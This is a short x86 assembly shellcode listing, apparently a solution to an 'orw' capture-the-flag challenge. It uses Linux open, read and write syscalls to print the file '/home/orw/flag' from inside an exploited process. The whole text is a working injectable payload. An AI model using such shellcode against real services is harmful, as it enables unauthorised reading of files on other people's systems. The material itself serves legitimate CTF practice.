global START
START:
	jmp MESSAGE

BACK:
	mov eax, 5
	pop ebx
	mov ecx, 0
	mov edx, 7
	int 80h

	mov ebx, eax
	mov eax, 3
	mov ecx, esp
	mov edx, 100
	int 80h

	mov eax, 4
	mov ebx, 1
	mov ecx, esp
	mov edx, 100
	int 80h

MESSAGE:
	call BACK
	file db '/home/orw/flag'
	db 00

